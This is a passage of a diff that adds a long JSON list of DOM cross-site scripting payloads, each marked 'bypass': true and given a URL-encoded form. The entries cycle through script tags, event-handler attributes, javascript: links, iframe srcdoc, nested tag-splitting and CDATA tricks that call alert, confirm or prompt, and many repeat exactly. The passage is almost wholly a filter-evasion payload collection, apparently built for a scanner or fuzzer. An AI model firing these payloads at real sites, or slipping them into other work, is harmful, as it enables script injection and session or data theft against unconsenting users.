+      "encoded": "%3Csvg%3E%3Cdesc%3E%3C%21%5BCDATA%5B%3Cscript%3Ealert%283%29%3C%2Fscript%3E%5D%5D%3E%3C%2Fdesc%3E%3C%2Fsvg%3E"
+    },
+    {
+      "type": "DOM",
+      "payload": "\u003cscript\u003ealert(3)\u003c/script\u003e",
+      "bypass": true,
+      "encoded": "%3Cscript%3Ealert%283%29%3C%2Fscript%3E"
+    },
+    {
+      "type": "DOM",
+      "payload": "\u003cimg src=x onload=alert(3)\u003e",
+      "bypass": true,
+      "encoded": "%3Cimg+src%3Dx+onload%3Dalert%283%29%3E"
+    },
+    {
+      "type": "DOM",
+      "payload": "\u003csvg onload=alert(3)\u003e",
+      "bypass": true,
+      "encoded": "%3Csvg+onload%3Dalert%283%29%3E"
+    },
+    {
+      "type": "DOM",
+      "payload": "\u003ca href=\"javascript:alert(3)\"\u003eclick\u003c/a\u003e",
+      "bypass": true,
+      "encoded": "%3Ca+href%3D%22javascript%3Aalert%283%29%22%3Eclick%3C%2Fa%3E"
+    },
+    {
+      "type": "DOM",
+      "payload": "\u003cbody onload=alert(3)\u003e",
+      "bypass": true,
+      "encoded": "%3Cbody+onload%3Dalert%283%29%3E"
+    },
+    {
+      "type": "DOM",
+      "payload": "\u003ciframe srcdoc=\"\u003cscript\u003ealert(3)\u003c/script\u003e\"\u003e\u003c/iframe\u003e",
+      "bypass": true,
+      "encoded": "%3Ciframe+srcdoc%3D%22%3Cscript%3Ealert%283%29%3C%2Fscript%3E%22%3E%3C%2Fiframe%3E"
+    },
+    {
+      "type": "DOM",
+      "payload": "\u003cinput autofocus onload=alert(3)\u003e",
+      "bypass": true,
+      "encoded": "%3Cinput+autofocus+onload%3Dalert%283%29%3E"
+    },
+    {
+      "type": "DOM",
+      "payload": "\u003cmath href=\"javascript:alert(3)\"\u003eCLICK\u003c/math\u003e",
+      "bypass": true,
+      "encoded": "%3Cmath+href%3D%22javascript%3Aalert%283%29%22%3ECLICK%3C%2Fmath%3E"
+    },
+    {
+      "type": "DOM",
+      "payload": "\u003cdetails open onload=alert(3)\u003e",
+      "bypass": true,
+      "encoded": "%3Cdetails+open+onload%3Dalert%283%29%3E"
+    },
+    {
+      "type": "DOM",
+      "payload": "\u003cscr\u003cscript\u003eipt\u003ealert(3)\u003c/scr\u003c/script\u003eipt\u003e",
+      "bypass": true,
+      "encoded": "%3Cscr%3Cscript%3Eipt%3Ealert%283%29%3C%2Fscr%3C%2Fscript%3Eipt%3E"
+    },
+    {
+      "type": "DOM",
+      "payload": "\u003csvg\u003e\u003cdesc\u003e\u003c![CDATA[\u003cscript\u003ealert(3)\u003c/script\u003e]]\u003e\u003c/desc\u003e\u003c/svg\u003e",
+      "bypass": true,
+      "encoded": "%3Csvg%3E%3Cdesc%3E%3C%21%5BCDATA%5B%3Cscript%3Ealert%283%29%3C%2Fscript%3E%5D%5D%3E%3C%2Fdesc%3E%3C%2Fsvg%3E"
+    },
+    {
+      "type": "DOM",
+      "payload": "\u003cscript\u003ealert(3)\u003c/script\u003e",
+      "bypass": true,
+      "encoded": "%3Cscript%3Ealert%283%29%3C%2Fscript%3E"
+    },
+    {
+      "type": "DOM",
+      "payload": "\u003cimg src=x onclick=alert(3)\u003e",
+      "bypass": true,
+      "encoded": "%3Cimg+src%3Dx+onclick%3Dalert%283%29%3E"
+    },
+    {
+      "type": "DOM",
+      "payload": "\u003csvg onclick=alert(3)\u003e",
+      "bypass": true,
+      "encoded": "%3Csvg+onclick%3Dalert%283%29%3E"
+    },
+    {
+      "type": "DOM",
+      "payload": "\u003ca href=\"javascript:alert(3)\"\u003eclick\u003c/a\u003e",
+      "bypass": true,
+      "encoded": "%3Ca+href%3D%22javascript%3Aalert%283%29%22%3Eclick%3C%2Fa%3E"
+    },
+    {
+      "type": "DOM",
+      "payload": "\u003cbody onclick=alert(3)\u003e",
+      "bypass": true,
+      "encoded": "%3Cbody+onclick%3Dalert%283%29%3E"
+    },
+    {
+      "type": "DOM",
+      "payload": "\u003ciframe srcdoc=\"\u003cscript\u003ealert(3)\u003c/script\u003e\"\u003e\u003c/iframe\u003e",
+      "bypass": true,
+      "encoded": "%3Ciframe+srcdoc%3D%22%3Cscript%3Ealert%283%29%3C%2Fscript%3E%22%3E%3C%2Fiframe%3E"
+    },
+    {
+      "type": "DOM",
+      "payload": "\u003cinput autofocus onclick=alert(3)\u003e",
+      "bypass": true,
+      "encoded": "%3Cinput+autofocus+onclick%3Dalert%283%29%3E"
+    },
+    {
+      "type": "DOM",
+      "payload": "\u003cmath href=\"javascript:alert(3)\"\u003eCLICK\u003c/math\u003e",
+      "bypass": true,
+      "encoded": "%3Cmath+href%3D%22javascript%3Aalert%283%29%22%3ECLICK%3C%2Fmath%3E"
+    },
+    {
+      "type": "DOM",
+      "payload": "\u003cdetails open onclick=alert(3)\u003e",
+      "bypass": true,
+      "encoded": "%3Cdetails+open+onclick%3Dalert%283%29%3E"
+    },
+    {
+      "type": "DOM",
+      "payload": "\u003cscr\u003cscript\u003eipt\u003ealert(3)\u003c/scr\u003c/script\u003eipt\u003e",
+      "bypass": true,
+      "encoded": "%3Cscr%3Cscript%3Eipt%3Ealert%283%29%3C%2Fscr%3C%2Fscript%3Eipt%3E"
+    },
+    {
+      "type": "DOM",
+      "payload": "\u003csvg\u003e\u003cdesc\u003e\u003c![CDATA[\u003cscript\u003ealert(3)\u003c/script\u003e]]\u003e\u003c/desc\u003e\u003c/svg\u003e",
+      "bypass": true,
+      "encoded": "%3Csvg%3E%3Cdesc%3E%3C%21%5BCDATA%5B%3Cscript%3Ealert%283%29%3C%2Fscript%3E%5D%5D%3E%3C%2Fdesc%3E%3C%2Fsvg%3E"
+    },
+    {
+      "type": "DOM",
+      "payload": "\u003cscript\u003ealert(3)\u003c/script\u003e",
+      "bypass": true,
+      "encoded": "%3Cscript%3Ealert%283%29%3C%2Fscript%3E"
+    },
+    {
+      "type": "DOM",
+      "payload": "\u003cimg src=x onfocus=alert(3)\u003e",
+      "bypass": true,
+      "encoded": "%3Cimg+src%3Dx+onfocus%3Dalert%283%29%3E"
+    },
+    {
+      "type": "DOM",
+      "payload": "\u003csvg onfocus=alert(3)\u003e",
+      "bypass": true,
+      "encoded": "%3Csvg+onfocus%3Dalert%283%29%3E"
+    },
+    {
+      "type": "DOM",
+      "payload": "\u003ca href=\"javascript:alert(3)\"\u003eclick\u003c/a\u003e",
+      "bypass": true,
+      "encoded": "%3Ca+href%3D%22javascript%3Aalert%283%29%22%3Eclick%3C%2Fa%3E"
+    },
+    {
+      "type": "DOM",
+      "payload": "\u003cbody onfocus=alert(3)\u003e",
+      "bypass": true,
+      "encoded": "%3Cbody+onfocus%3Dalert%283%29%3E"
+    },
+    {
+      "type": "DOM",
+      "payload": "\u003ciframe srcdoc=\"\u003cscript\u003ealert(3)\u003c/script\u003e\"\u003e\u003c/iframe\u003e",
+      "bypass": true,
+      "encoded": "%3Ciframe+srcdoc%3D%22%3Cscript%3Ealert%283%29%3C%2Fscript%3E%22%3E%3C%2Fiframe%3E"
+    },
+    {
+      "type": "DOM",
+      "payload": "\u003cinput autofocus onfocus=alert(3)\u003e",
+      "bypass": true,
+      "encoded": "%3Cinput+autofocus+onfocus%3Dalert%283%29%3E"
+    },
+    {
+      "type": "DOM",
+      "payload": "\u003cmath href=\"javascript:alert(3)\"\u003eCLICK\u003c/math\u003e",
+      "bypass": true,
+      "encoded": "%3Cmath+href%3D%22javascript%3Aalert%283%29%22%3ECLICK%3C%2Fmath%3E"
+    },
+    {
+      "type": "DOM",
+      "payload": "\u003cdetails open onfocus=alert(3)\u003e",
+      "bypass": true,
+      "encoded": "%3Cdetails+open+onfocus%3Dalert%283%29%3E"
+    },
+    {
+      "type": "DOM",
+      "payload": "\u003cscr\u003cscript\u003eipt\u003ealert(3)\u003c/scr\u003c/script\u003eipt\u003e",
+      "bypass": true,
+      "encoded": "%3Cscr%3Cscript%3Eipt%3Ealert%283%29%3C%2Fscr%3C%2Fscript%3Eipt%3E"
+    },
+    {
+      "type": "DOM",
+      "payload": "\u003csvg\u003e\u003cdesc\u003e\u003c![CDATA[\u003cscript\u003ealert(3)\u003c/script\u003e]]\u003e\u003c/desc\u003e\u003c/svg\u003e",
+      "bypass": true,
+      "encoded": "%3Csvg%3E%3Cdesc%3E%3C%21%5BCDATA%5B%3Cscript%3Ealert%283%29%3C%2Fscript%3E%5D%5D%3E%3C%2Fdesc%3E%3C%2Fsvg%3E"
+    },
+    {
+      "type": "DOM",
+      "payload": "\u003cscript\u003ealert(3)\u003c/script\u003e",
+      "bypass": true,
+      "encoded": "%3Cscript%3Ealert%283%29%3C%2Fscript%3E"
+    },
+    {
+      "type": "DOM",
+      "payload": "\u003cimg src=x ontoggle=alert(3)\u003e",
+      "bypass": true,
+      "encoded": "%3Cimg+src%3Dx+ontoggle%3Dalert%283%29%3E"
+    },
+    {
+      "type": "DOM",
+      "payload": "\u003csvg ontoggle=alert(3)\u003e",
+      "bypass": true,
+      "encoded": "%3Csvg+ontoggle%3Dalert%283%29%3E"
+    },
+    {
+      "type": "DOM",
+      "payload": "\u003ca href=\"javascript:alert(3)\"\u003eclick\u003c/a\u003e",
+      "bypass": true,
+      "encoded": "%3Ca+href%3D%22javascript%3Aalert%283%29%22%3Eclick%3C%2Fa%3E"
+    },
+    {
+      "type": "DOM",
+      "payload": "\u003cbody ontoggle=alert(3)\u003e",
+      "bypass": true,
+      "encoded": "%3Cbody+ontoggle%3Dalert%283%29%3E"
+    },
+    {
+      "type": "DOM",
+      "payload": "\u003ciframe srcdoc=\"\u003cscript\u003ealert(3)\u003c/script\u003e\"\u003e\u003c/iframe\u003e",
+      "bypass": true,
+      "encoded": "%3Ciframe+srcdoc%3D%22%3Cscript%3Ealert%283%29%3C%2Fscript%3E%22%3E%3C%2Fiframe%3E"
+    },
+    {
+      "type": "DOM",
+      "payload": "\u003cinput autofocus ontoggle=alert(3)\u003e",
+      "bypass": true,
+      "encoded": "%3Cinput+autofocus+ontoggle%3Dalert%283%29%3E"
+    },
+    {
+      "type": "DOM",
+      "payload": "\u003cmath href=\"javascript:alert(3)\"\u003eCLICK\u003c/math\u003e",
+      "bypass": true,
+      "encoded": "%3Cmath+href%3D%22javascript%3Aalert%283%29%22%3ECLICK%3C%2Fmath%3E"
+    },
+    {
+      "type": "DOM",
+      "payload": "\u003cdetails open ontoggle=alert(3)\u003e",
+      "bypass": true,
+      "encoded": "%3Cdetails+open+ontoggle%3Dalert%283%29%3E"
+    },
+    {
+      "type": "DOM",
+      "payload": "\u003cscr\u003cscript\u003eipt\u003ealert(3)\u003c/scr\u003c/script\u003eipt\u003e",
+      "bypass": true,
+      "encoded": "%3Cscr%3Cscript%3Eipt%3Ealert%283%29%3C%2Fscr%3C%2Fscript%3Eipt%3E"
+    },
+    {
+      "type": "DOM",
+      "payload": "\u003csvg\u003e\u003cdesc\u003e\u003c![CDATA[\u003cscript\u003ealert(3)\u003c/script\u003e]]\u003e\u003c/desc\u003e\u003c/svg\u003e",
+      "bypass": true,
+      "encoded": "%3Csvg%3E%3Cdesc%3E%3C%21%5BCDATA%5B%3Cscript%3Ealert%283%29%3C%2Fscript%3E%5D%5D%3E%3C%2Fdesc%3E%3C%2Fsvg%3E"
+    },
+    {
+      "type": "DOM",
+      "payload": "\u003cscript\u003econfirm(3)\u003c/script\u003e",
+      "bypass": true,
+      "encoded": "%3Cscript%3Econfirm%283%29%3C%2Fscript%3E"
+    },
+    {
+      "type": "DOM",
+      "payload": "\u003cimg src=x onerror=confirm(3)\u003e",
+      "bypass": true,
+      "encoded": "%3Cimg+src%3Dx+onerror%3Dconfirm%283%29%3E"
+    },
+    {
+      "type": "DOM",
+      "payload": "\u003csvg onerror=confirm(3)\u003e",
+      "bypass": true,
+      "encoded": "%3Csvg+onerror%3Dconfirm%283%29%3E"
+    },
+    {
+      "type": "DOM",
+      "payload": "\u003ca href=\"javascript:confirm(3)\"\u003eclick\u003c/a\u003e",
+      "bypass": true,
+      "encoded": "%3Ca+href%3D%22javascript%3Aconfirm%283%29%22%3Eclick%3C%2Fa%3E"
+    },
+    {
+      "type": "DOM",
+      "payload": "\u003cbody onerror=confirm(3)\u003e",
+      "bypass": true,
+      "encoded": "%3Cbody+onerror%3Dconfirm%283%29%3E"
+    },
+    {
+      "type": "DOM",
+      "payload": "\u003ciframe srcdoc=\"\u003cscript\u003econfirm(3)\u003c/script\u003e\"\u003e\u003c/iframe\u003e",
+      "bypass": true,
+      "encoded": "%3Ciframe+srcdoc%3D%22%3Cscript%3Econfirm%283%29%3C%2Fscript%3E%22%3E%3C%2Fiframe%3E"
+    },
+    {
+      "type": "DOM",
+      "payload": "\u003cinput autofocus onerror=confirm(3)\u003e",
+      "bypass": true,
+      "encoded": "%3Cinput+autofocus+onerror%3Dconfirm%283%29%3E"
+    },
+    {
+      "type": "DOM",
+      "payload": "\u003cmath href=\"javascript:confirm(3)\"\u003eCLICK\u003c/math\u003e",
+      "bypass": true,
+      "encoded": "%3Cmath+href%3D%22javascript%3Aconfirm%283%29%22%3ECLICK%3C%2Fmath%3E"
+    },
+    {
+      "type": "DOM",
+      "payload": "\u003cdetails open onerror=confirm(3)\u003e",
+      "bypass": true,
+      "encoded": "%3Cdetails+open+onerror%3Dconfirm%283%29%3E"
+    },
+    {
+      "type": "DOM",
+      "payload": "\u003cscr\u003cscript\u003eipt\u003econfirm(3)\u003c/scr\u003c/script\u003eipt\u003e",
+      "bypass": true,
+      "encoded": "%3Cscr%3Cscript%3Eipt%3Econfirm%283%29%3C%2Fscr%3C%2Fscript%3Eipt%3E"
+    },
+    {
+      "type": "DOM",
+      "payload": "\u003csvg\u003e\u003cdesc\u003e\u003c![CDATA[\u003cscript\u003econfirm(3)\u003c/script\u003e]]\u003e\u003c/desc\u003e\u003c/svg\u003e",
+      "bypass": true,
+      "encoded": "%3Csvg%3E%3Cdesc%3E%3C%21%5BCDATA%5B%3Cscript%3Econfirm%283%29%3C%2Fscript%3E%5D%5D%3E%3C%2Fdesc%3E%3C%2Fsvg%3E"
+    },
+    {
+      "type": "DOM",
+      "payload": "\u003cscript\u003econfirm(3)\u003c/script\u003e",
+      "bypass": true,
+      "encoded": "%3Cscript%3Econfirm%283%29%3C%2Fscript%3E"
+    },
+    {
+      "type": "DOM",
+      "payload": "\u003cimg src=x onload=confirm(3)\u003e",
+      "bypass": true,
+      "encoded": "%3Cimg+src%3Dx+onload%3Dconfirm%283%29%3E"
+    },
+    {
+      "type": "DOM",
+      "payload": "\u003csvg onload=confirm(3)\u003e",
+      "bypass": true,
+      "encoded": "%3Csvg+onload%3Dconfirm%283%29%3E"
+    },
+    {
+      "type": "DOM",
+      "payload": "\u003ca href=\"javascript:confirm(3)\"\u003eclick\u003c/a\u003e",
+      "bypass": true,
+      "encoded": "%3Ca+href%3D%22javascript%3Aconfirm%283%29%22%3Eclick%3C%2Fa%3E"
+    },
+    {
+      "type": "DOM",
+      "payload": "\u003cbody onload=confirm(3)\u003e",
+      "bypass": true,
+      "encoded": "%3Cbody+onload%3Dconfirm%283%29%3E"
+    },
+    {
+      "type": "DOM",
+      "payload": "\u003ciframe srcdoc=\"\u003cscript\u003econfirm(3)\u003c/script\u003e\"\u003e\u003c/iframe\u003e",
+      "bypass": true,
+      "encoded": "%3Ciframe+srcdoc%3D%22%3Cscript%3Econfirm%283%29%3C%2Fscript%3E%22%3E%3C%2Fiframe%3E"
+    },
+    {
+      "type": "DOM",
+      "payload": "\u003cinput autofocus onload=confirm(3)\u003e",
+      "bypass": true,
+      "encoded": "%3Cinput+autofocus+onload%3Dconfirm%283%29%3E"
+    },
+    {
+      "type": "DOM",
+      "payload": "\u003cmath href=\"javascript:confirm(3)\"\u003eCLICK\u003c/math\u003e",
+      "bypass": true,
+      "encoded": "%3Cmath+href%3D%22javascript%3Aconfirm%283%29%22%3ECLICK%3C%2Fmath%3E"
+    },
+    {
+      "type": "DOM",
+      "payload": "\u003cdetails open onload=confirm(3)\u003e",
+      "bypass": true,
+      "encoded": "%3Cdetails+open+onload%3Dconfirm%283%29%3E"
+    },
+    {
+      "type": "DOM",
+      "payload": "\u003cscr\u003cscript\u003eipt\u003econfirm(3)\u003c/scr\u003c/script\u003eipt\u003e",
+      "bypass": true,
+      "encoded": "%3Cscr%3Cscript%3Eipt%3Econfirm%283%29%3C%2Fscr%3C%2Fscript%3Eipt%3E"
+    },
+    {
+      "type": "DOM",
+      "payload": "\u003csvg\u003e\u003cdesc\u003e\u003c![CDATA[\u003cscript\u003econfirm(3)\u003c/script\u003e]]\u003e\u003c/desc\u003e\u003c/svg\u003e",
+      "bypass": true,
+      "encoded": "%3Csvg%3E%3Cdesc%3E%3C%21%5BCDATA%5B%3Cscript%3Econfirm%283%29%3C%2Fscript%3E%5D%5D%3E%3C%2Fdesc%3E%3C%2Fsvg%3E"
+    },
+    {
+      "type": "DOM",
+      "payload": "\u003cscript\u003econfirm(3)\u003c/script\u003e",
+      "bypass": true,
+      "encoded": "%3Cscript%3Econfirm%283%29%3C%2Fscript%3E"
+    },
+    {
+      "type": "DOM",
+      "payload": "\u003cimg src=x onclick=confirm(3)\u003e",
+      "bypass": true,
+      "encoded": "%3Cimg+src%3Dx+onclick%3Dconfirm%283%29%3E"
+    },
+    {
+      "type": "DOM",
+      "payload": "\u003csvg onclick=confirm(3)\u003e",
+      "bypass": true,
+      "encoded": "%3Csvg+onclick%3Dconfirm%283%29%3E"
+    },
+    {
+      "type": "DOM",
+      "payload": "\u003ca href=\"javascript:confirm(3)\"\u003eclick\u003c/a\u003e",
+      "bypass": true,
+      "encoded": "%3Ca+href%3D%22javascript%3Aconfirm%283%29%22%3Eclick%3C%2Fa%3E"
+    },
+    {
+      "type": "DOM",
+      "payload": "\u003cbody onclick=confirm(3)\u003e",
+      "bypass": true,
+      "encoded": "%3Cbody+onclick%3Dconfirm%283%29%3E"
+    },
+    {
+      "type": "DOM",
+      "payload": "\u003ciframe srcdoc=\"\u003cscript\u003econfirm(3)\u003c/script\u003e\"\u003e\u003c/iframe\u003e",
+      "bypass": true,
+      "encoded": "%3Ciframe+srcdoc%3D%22%3Cscript%3Econfirm%283%29%3C%2Fscript%3E%22%3E%3C%2Fiframe%3E"
+    },
+    {
+      "type": "DOM",
+      "payload": "\u003cinput autofocus onclick=confirm(3)\u003e",
+      "bypass": true,
+      "encoded": "%3Cinput+autofocus+onclick%3Dconfirm%283%29%3E"
+    },
+    {
+      "type": "DOM",
+      "payload": "\u003cmath href=\"javascript:confirm(3)\"\u003eCLICK\u003c/math\u003e",
+      "bypass": true,
+      "encoded": "%3Cmath+href%3D%22javascript%3Aconfirm%283%29%22%3ECLICK%3C%2Fmath%3E"
+    },
+    {
+      "type": "DOM",
+      "payload": "\u003cdetails open onclick=confirm(3)\u003e",
+      "bypass": true,
+      "encoded": "%3Cdetails+open+onclick%3Dconfirm%283%29%3E"
+    },
+    {
+      "type": "DOM",
+      "payload": "\u003cscr\u003cscript\u003eipt\u003econfirm(3)\u003c/scr\u003c/script\u003eipt\u003e",
+      "bypass": true,
+      "encoded": "%3Cscr%3Cscript%3Eipt%3Econfirm%283%29%3C%2Fscr%3C%2Fscript%3Eipt%3E"
+    },
+    {
+      "type": "DOM",
+      "payload": "\u003csvg\u003e\u003cdesc\u003e\u003c![CDATA[\u003cscript\u003econfirm(3)\u003c/script\u003e]]\u003e\u003c/desc\u003e\u003c/svg\u003e",
+      "bypass": true,
+      "encoded": "%3Csvg%3E%3Cdesc%3E%3C%21%5BCDATA%5B%3Cscript%3Econfirm%283%29%3C%2Fscript%3E%5D%5D%3E%3C%2Fdesc%3E%3C%2Fsvg%3E"
+    },
+    {
+      "type": "DOM",
+      "payload": "\u003cscript\u003econfirm(3)\u003c/script\u003e",
+      "bypass": true,
+      "encoded": "%3Cscript%3Econfirm%283%29%3C%2Fscript%3E"
+    },
+    {
+      "type": "DOM",
+      "payload": "\u003cimg src=x onfocus=confirm(3)\u003e",
+      "bypass": true,
+      "encoded": "%3Cimg+src%3Dx+onfocus%3Dconfirm%283%29%3E"
+    },
+    {
+      "type": "DOM",
+      "payload": "\u003csvg onfocus=confirm(3)\u003e",
+      "bypass": true,
+      "encoded": "%3Csvg+onfocus%3Dconfirm%283%29%3E"
+    },
+    {
+      "type": "DOM",
+      "payload": "\u003ca href=\"javascript:confirm(3)\"\u003eclick\u003c/a\u003e",
+      "bypass": true,
+      "encoded": "%3Ca+href%3D%22javascript%3Aconfirm%283%29%22%3Eclick%3C%2Fa%3E"
+    },
+    {
+      "type": "DOM",
+      "payload": "\u003cbody onfocus=confirm(3)\u003e",
+      "bypass": true,
+      "encoded": "%3Cbody+onfocus%3Dconfirm%283%29%3E"
+    },
+    {
+      "type": "DOM",
+      "payload": "\u003ciframe srcdoc=\"\u003cscript\u003econfirm(3)\u003c/script\u003e\"\u003e\u003c/iframe\u003e",
+      "bypass": true,
+      "encoded": "%3Ciframe+srcdoc%3D%22%3Cscript%3Econfirm%283%29%3C%2Fscript%3E%22%3E%3C%2Fiframe%3E"
+    },
+    {
+      "type": "DOM",
+      "payload": "\u003cinput autofocus onfocus=confirm(3)\u003e",
+      "bypass": true,
+      "encoded": "%3Cinput+autofocus+onfocus%3Dconfirm%283%29%3E"
+    },
+    {
+      "type": "DOM",
+      "payload": "\u003cmath href=\"javascript:confirm(3)\"\u003eCLICK\u003c/math\u003e",
+      "bypass": true,
+      "encoded": "%3Cmath+href%3D%22javascript%3Aconfirm%283%29%22%3ECLICK%3C%2Fmath%3E"
+    },
+    {
+      "type": "DOM",
+      "payload": "\u003cdetails open onfocus=confirm(3)\u003e",
+      "bypass": true,
+      "encoded": "%3Cdetails+open+onfocus%3Dconfirm%283%29%3E"
+    },
+    {
+      "type": "DOM",
+      "payload": "\u003cscr\u003cscript\u003eipt\u003econfirm(3)\u003c/scr\u003c/script\u003eipt\u003e",
+      "bypass": true,
+      "encoded": "%3Cscr%3Cscript%3Eipt%3Econfirm%283%29%3C%2Fscr%3C%2Fscript%3Eipt%3E"
+    },
+    {
+      "type": "DOM",
+      "payload": "\u003csvg\u003e\u003cdesc\u003e\u003c![CDATA[\u003cscript\u003econfirm(3)\u003c/script\u003e]]\u003e\u003c/desc\u003e\u003c/svg\u003e",
+      "bypass": true,
+      "encoded": "%3Csvg%3E%3Cdesc%3E%3C%21%5BCDATA%5B%3Cscript%3Econfirm%283%29%3C%2Fscript%3E%5D%5D%3E%3C%2Fdesc%3E%3C%2Fsvg%3E"
+    },
+    {
+      "type": "DOM",
+      "payload": "\u003cscript\u003econfirm(3)\u003c/script\u003e",
+      "bypass": true,
+      "encoded": "%3Cscript%3Econfirm%283%29%3C%2Fscript%3E"
+    },
+    {
+      "type": "DOM",
+      "payload": "\u003cimg src=x ontoggle=confirm(3)\u003e",
+      "bypass": true,
+      "encoded": "%3Cimg+src%3Dx+ontoggle%3Dconfirm%283%29%3E"
+    },
+    {
+      "type": "DOM",
+      "payload": "\u003csvg ontoggle=confirm(3)\u003e",
+      "bypass": true,
+      "encoded": "%3Csvg+ontoggle%3Dconfirm%283%29%3E"
+    },
+    {
+      "type": "DOM",
+      "payload": "\u003ca href=\"javascript:confirm(3)\"\u003eclick\u003c/a\u003e",
+      "bypass": true,
+      "encoded": "%3Ca+href%3D%22javascript%3Aconfirm%283%29%22%3Eclick%3C%2Fa%3E"
+    },
+    {
+      "type": "DOM",
+      "payload": "\u003cbody ontoggle=confirm(3)\u003e",
+      "bypass": true,
+      "encoded": "%3Cbody+ontoggle%3Dconfirm%283%29%3E"
+    },
+    {
+      "type": "DOM",
+      "payload": "\u003ciframe srcdoc=\"\u003cscript\u003econfirm(3)\u003c/script\u003e\"\u003e\u003c/iframe\u003e",
+      "bypass": true,
+      "encoded": "%3Ciframe+srcdoc%3D%22%3Cscript%3Econfirm%283%29%3C%2Fscript%3E%22%3E%3C%2Fiframe%3E"
+    },
+    {
+      "type": "DOM",
+      "payload": "\u003cinput autofocus ontoggle=confirm(3)\u003e",
+      "bypass": true,
+      "encoded": "%3Cinput+autofocus+ontoggle%3Dconfirm%283%29%3E"
+    },
+    {
+      "type": "DOM",
+      "payload": "\u003cmath href=\"javascript:confirm(3)\"\u003eCLICK\u003c/math\u003e",
+      "bypass": true,
+      "encoded": "%3Cmath+href%3D%22javascript%3Aconfirm%283%29%22%3ECLICK%3C%2Fmath%3E"
+    },
+    {
+      "type": "DOM",
+      "payload": "\u003cdetails open ontoggle=confirm(3)\u003e",
+      "bypass": true,
+      "encoded": "%3Cdetails+open+ontoggle%3Dconfirm%283%29%3E"
+    },
+    {
+      "type": "DOM",
+      "payload": "\u003cscr\u003cscript\u003eipt\u003econfirm(3)\u003c/scr\u003c/script\u003eipt\u003e",
+      "bypass": true,
+      "encoded": "%3Cscr%3Cscript%3Eipt%3Econfirm%283%29%3C%2Fscr%3C%2Fscript%3Eipt%3E"
+    },
+    {
+      "type": "DOM",
+      "payload": "\u003csvg\u003e\u003cdesc\u003e\u003c![CDATA[\u003cscript\u003econfirm(3)\u003c/script\u003e]]\u003e\u003c/desc\u003e\u003c/svg\u003e",
+      "bypass": true,
+      "encoded": "%3Csvg%3E%3Cdesc%3E%3C%21%5BCDATA%5B%3Cscript%3Econfirm%283%29%3C%2Fscript%3E%5D%5D%3E%3C%2Fdesc%3E%3C%2Fsvg%3E"
+    },
+    {
+      "type": "DOM",
+      "payload": "\u003cscript\u003eprompt(3)\u003c/script\u003e",
+      "bypass": true,
+      "encoded": "%3Cscript%3Eprompt%283%29%3C%2Fscript%3E"
+    },
+    {
+      "type": "DOM",
+      "payload": "\u003cimg src=x onerror=prompt(3)\u003e",
+      "bypass": true,
+      "encoded": "%3Cimg+src%3Dx+onerror%3Dprompt%283%29%3E"
+    },
+    {
+      "type": "DOM",
+      "payload": "\u003csvg onerror=prompt(3)\u003e",
+      "bypass": true,
+      "encoded": "%3Csvg+onerror%3Dprompt%283%29%3E"
+    },
+    {
+      "type": "DOM",
+      "payload": "\u003ca href=\"javascript:prompt(3)\"\u003eclick\u003c/a\u003e",
+      "bypass": true,
+      "encoded": "%3Ca+href%3D%22javascript%3Aprompt%283%29%22%3Eclick%3C%2Fa%3E"
+    },
+    {
+      "type": "DOM",
+      "payload": "\u003cbody onerror=prompt(3)\u003e",
+      "bypass": true,
+      "encoded": "%3Cbody+onerror%3Dprompt%283%29%3E"
+    },
+    {
+      "type": "DOM",
+      "payload": "\u003ciframe srcdoc=\"\u003cscript\u003eprompt(3)\u003c/script\u003e\"\u003e\u003c/iframe\u003e",
+      "bypass": true,
+      "encoded": "%3Ciframe+srcdoc%3D%22%3Cscript%3Eprompt%283%29%3C%2Fscript%3E%22%3E%3C%2Fiframe%3E"
+    },
+    {
+      "type": "DOM",
+      "payload": "\u003cinput autofocus onerror=prompt(3)\u003e",
+      "bypass": true,
+      "encoded": "%3Cinput+autofocus+onerror%3Dprompt%283%29%3E"
+    },
+    {
+      "type": "DOM",
+      "payload": "\u003cmath href=\"javascript:prompt(3)\"\u003eCLICK\u003c/math\u003e",
+      "bypass": true,
+      "encoded": "%3Cmath+href%3D%22javascript%3Aprompt%283%29%22%3ECLICK%3C%2Fmath%3E"
+    },
+    {
+      "type": "DOM",
+      "payload": "\u003cdetails open onerror=prompt(3)\u003e",
+      "bypass": true,
+      "encoded": "%3Cdetails+open+onerror%3Dprompt%283%29%3E"
+    },
+    {
+      "type": "DOM",
+      "payload": "\u003cscr\u003cscript\u003eipt\u003eprompt(3)\u003c/scr\u003c/script\u003eipt\u003e",
+      "bypass": true,
+      "encoded": "%3Cscr%3Cscript%3Eipt%3Eprompt%283%29%3C%2Fscr%3C%2Fscript%3Eipt%3E"
+    },
+    {
+      "type": "DOM",
+      "payload": "\u003csvg\u003e\u003cdesc\u003e\u003c![CDATA[\u003cscript\u003eprompt(3)\u003c/script\u003e]]\u003e\u003c/desc\u003e\u003c/svg\u003e",
+      "bypass": true,
+      "encoded": "%3Csvg%3E%3Cdesc%3E%3C%21%5BCDATA%5B%3Cscript%3Eprompt%283%29%3C%2Fscript%3E%5D%5D%3E%3C%2Fdesc%3E%3C%2Fsvg%3E"
+    },
+    {
+      "type": "DOM",
+      "payload": "\u003cscript\u003eprompt(3)\u003c/script\u003e",
+      "bypass": true,
+      "encoded": "%3Cscript%3Eprompt%283%29%3C%2Fscript%3E"
+    },
+    {
+      "type": "DOM",
+      "payload": "\u003cimg src=x onload=prompt(3)\u003e",
+      "bypass": true,
+      "encoded": "%3Cimg+src%3Dx+onload%3Dprompt%283%29%3E"
+    },
+    {
+      "type": "DOM",
+      "payload": "\u003csvg onload=prompt(3)\u003e",
+      "bypass": true,
+      "encoded": "%3Csvg+onload%3Dprompt%283%29%3E"
+    },
+    {
+      "type": "DOM",
+      "payload": "\u003ca href=\"javascript:prompt(3)\"\u003eclick\u003c/a\u003e",
+      "bypass": true,
+      "encoded": "%3Ca+href%3D%22javascript%3Aprompt%283%29%22%3Eclick%3C%2Fa%3E"
+    },
+    {
+      "type": "DOM",
+      "payload": "\u003cbody onload=prompt(3)\u003e",
+      "bypass": true,
+      "encoded": "%3Cbody+onload%3Dprompt%283%29%3E"
+    },
+    {
+      "type": "DOM",
+      "payload": "\u003ciframe srcdoc=\"\u003cscript\u003eprompt(3)\u003c/script\u003e\"\u003e\u003c/iframe\u003e",
+      "bypass": true,
+      "encoded": "%3Ciframe+srcdoc%3D%22%3Cscript%3Eprompt%283%29%3C%2Fscript%3E%22%3E%3C%2Fiframe%3E"
+    },
+    {
+      "type": "DOM",
+      "payload": "\u003cinput autofocus onload=prompt(3)\u003e",
+      "bypass": true,
+      "encoded": "%3Cinput+autofocus+onload%3Dprompt%283%29%3E"
+    },
+    {
